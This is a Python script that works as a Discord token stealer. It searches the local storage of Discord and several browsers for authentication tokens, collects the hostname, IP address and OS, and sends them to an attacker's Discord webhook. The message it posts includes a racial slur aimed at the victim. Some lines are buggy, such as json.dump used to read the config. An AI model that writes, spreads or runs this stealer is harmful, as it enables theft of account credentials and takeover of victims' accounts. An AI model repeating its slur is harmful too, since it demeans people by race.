import os
import discord_webhook
import json
import platform
import socket
import re
# pre-run needed variables
config = json.dump("CONFIG.json")
hostname=socket.gethostname()
IPAddr=socket.gethostbyname(hostname)
local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

paths = {
    'Discord': roaming + '\\Discord',
    'Discord Canary': roaming + '\\discordcanary',
    'Discord PTB': roaming + '\\discordptb',
    'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
    'Opera': roaming + '\\Opera Software\\Opera Stable',
    'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
    'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
}
def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens
message = ''
for platform, path in paths.items():
    if not os.path.exists(path):
        continue
    message += f'\n**{platform}**\n```\n'
    tokens = find_tokens(path)
    if len(tokens) > 0:
        for token in tokens:
            message += f'{token}\n'
    else:
        message += 'No tokens found.\n'
    message += '```'
# webhook
embedcont = f'''ISOLATION
---------------------
get grabbed nigga
---------------------
Operating system >> {platform.system()}
OS.name >> {os.name}
HostName >> {hostname}
Ip Address >> {IPAddr}


---------------------
Tokens >>>
{message}
'''

def main():
    webhook = discord_webhook.DiscordWebhook(webhook=config["WEBHOOK"])
    embed = discord_webhook.DiscordEmbed(title="get grabbed",content=embedcont, color="03b2f8")
    webhook.add_embed(embed=embed)
    webhook.execute()
if __name__== "__main__":
    main()